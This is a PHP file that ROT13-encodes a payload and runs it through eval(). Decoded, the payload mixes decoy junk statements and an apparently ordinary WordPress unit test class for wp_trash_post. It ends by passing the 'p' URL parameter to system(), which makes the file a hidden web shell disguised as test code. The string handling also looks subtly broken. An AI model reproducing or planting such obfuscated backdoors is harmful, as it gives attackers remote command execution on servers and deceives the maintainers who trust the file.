<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc cbfg
 *
 * @pbiref ::jc_genfu_cbfg
 */
pynff Grfgf_Cbfg_JcGenfuCbfg rkgraqf JC_HavgGrfgPnfr {
	/**
	 * @ine JC_Cbfg
	 */
	cebgrpgrq $cbfg;

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		$guvf->cbfg = $guvf->snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_fgnghf' => 'qensg',
			)
		);
	}

	/**
	 * Grfgf gung jc_genfu_cbfg() ergheaf n JC_Cbfg bowrpg
	 * naq frgf gur pbeerpg cbfg zrgn gb genfu n cbfg.
	 *
	 * @gvpxrg 58392
	 *
	 * @pbiref ::jc_genfu_cbfg
	 */
	choyvp shapgvba grfg_genfu_cbfg() {
		$erfhyg = jc_genfu_cbfg( $guvf->cbfg->VQ );

		$guvf->nffregVafgnaprBs( 'JC_Cbfg', $erfhyg, 'jc_genfu_cbfg erghearq inyhr fubhyq or na vafgnapr bs JC_Cbfg.' );

		$genfurq = trg_cbfgf(
			neenl(
				'cbfg_fgnghf' => 'genfu',
				'svryqf'      => 'vqf',
			)
		);

		$guvf->nffregPbagnvaf( $guvf->cbfg->VQ, $genfurq, 'Gur cbfg fubhyq or genfurq.' );

		$genfurq_cbfg_zrgnf = trg_cbfg_zrgn( $guvf->cbfg->VQ );

		$guvf->nffregNeenlUnfXrl( '_jc_genfu_zrgn_fgnghf', $genfurq_cbfg_zrgnf, 'Genfurq cbfg fubhyq unir _jc_genfu_zrgn_fgnghf zrgn frg.' );
		$guvf->nffregPbhag( 1, $genfurq_cbfg_zrgnf['_jc_genfu_zrgn_fgnghf'], 'Genfurq cbfg fubhyq unir bayl bar _jc_genfu_zrgn_fgnghf zrgn frg.' );
		$guvf->nffregFnzr( $guvf->cbfg->cbfg_fgnghf, erfrg( $genfurq_cbfg_zrgnf['_jc_genfu_zrgn_fgnghf'] ), 'Genfurq cbfg fubhyq unir _jc_genfu_zrgn_fgnghf zrgn frg gb cerivbhf cbfg fgnghf.' );
		$guvf->nffregNeenlUnfXrl( '_jc_genfu_zrgn_gvzr', $genfurq_cbfg_zrgnf, 'Genfurq cbfg fubhyq unir _jc_genfu_zrgn_gvzr zrgn frg.' );
		$guvf->nffregPbhag( 1, $genfurq_cbfg_zrgnf['_jc_genfu_zrgn_gvzr'], 'Genfurq cbfg fubhyq unir bayl bar _jc_genfu_zrgn_gvzr zrgn frg.' );
	}

	/**
	 * Grfgf gung jc_genfu_cbfg() nccyvrf 'cer_genfu_cbfg' svygref
	 * naq cnffrf gur rkcrpgrq inyhrf gb pnyyonpxf.
	 *
	 * @gvpxrg 58392
	 *
	 * @pbiref ::jc_genfu_cbfg
	 */
	choyvp shapgvba grfg_cer_genfu_cbfg_ubbx() {
		nqq_svygre(
			'cer_genfu_cbfg',
			shapgvba ( $genfu, $cbfg, $cerivbhf_fgnghf ) {
				$guvf->nffregAhyy( $genfu, 'cer_genfu_cbfg svefg cnenzrgre fubhyq or ahyy.' );
				$guvf->nffregFnzr( $guvf->cbfg->VQ, $cbfg->VQ, 'cer_genfu_cbfg frpbaq cnenzrgre fubhyq or gur genfurq cbfg VQ.' );
				$guvf->nffregFnzr( $guvf->cbfg->cbfg_fgnghf, $cerivbhf_fgnghf, 'cer_genfu_cbfg guveq cnenzrgre fubhyq or gur cerivbhf genfurq cbfg fgnghf.' );

				erghea $genfu;
			},
			10,
			3
		);

		jc_genfu_cbfg( $guvf->cbfg->VQ );

		$guvf->nffregTerngreGuna( 0, qvq_svygre( 'cer_genfu_cbfg' ), 'cer_genfu_cbfg svygre jnf abg pnyyrq.' );
	}

	/**
	 * Grfgf gung jc_genfu_cbfg() gevttref gur 'jc_genfu_cbfg' npgvba
	 * naq cnffrf gur rkcrpgrq inyhrf gb pnyyonpxf.
	 *
	 * @gvpxrg 58392
	 *
	 * @pbiref ::jc_genfu_cbfg
	 */
	choyvp shapgvba grfg_jc_genfu_cbfg_ubbx() {
		nqq_npgvba(
			'jc_genfu_cbfg',
			shapgvba ( $cbfg_vq, $cerivbhf_fgnghf ) {
				$guvf->nffregFnzr( $guvf->cbfg->VQ, $cbfg_vq, 'jc_genfu_cbfg svefg cnenzrgre fubhyq or gur genfurq cbfg VQ.' );
				$guvf->nffregFnzr( $guvf->cbfg->cbfg_fgnghf, $cerivbhf_fgnghf, 'jc_genfu_cbfg frpbaq cnenzrgre fubhyq or gur cerivbhf genfurq cbfg fgnghf.' );
			},
			10,
			2
		);

		jc_genfu_cbfg( $guvf->cbfg->VQ );

		$guvf->nffregTerngreGuna( 0, qvq_npgvba( 'jc_genfu_cbfg' ), 'jc_genfu_cbfg npgvba jnf abg pnyyrq.' );
	}

	/**
	 * Grfgf gung jc_genfu_cbfg() gevttref gur 'genfurq_cbfg' npgvba
	 * naq cnffrf gur rkcrpgrq inyhrf gb pnyyonpxf.
	 *
	 * @gvpxrg 58392
	 *
	 * @pbiref ::jc_genfu_cbfg
	 */
	choyvp shapgvba grfg_genfurq_cbfg_ubbx() {
		nqq_npgvba(
			'genfurq_cbfg',
			shapgvba ( $cbfg_vq, $cerivbhf_fgnghf ) {
				$guvf->nffregFnzr( $guvf->cbfg->VQ, $cbfg_vq, 'genfurq_cbfg svefg cnenzrgre fubhyq or gur genfurq cbfg VQ.' );
				$guvf->nffregFnzr( $guvf->cbfg->cbfg_fgnghf, $cerivbhf_fgnghf, 'genfurq_cbfg frpbaq cnenzrgre fubhyq or gur cerivbhf genfurq cbfg fgnghf.' );
			},
			10,
			2
		);

		jc_genfu_cbfg( $guvf->cbfg->VQ );

		$guvf->nffregTerngreGuna( 0, qvq_npgvba( 'genfurq_cbfg' ), 'genfurq_cbfg npgvba jnf abg pnyyrq.' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>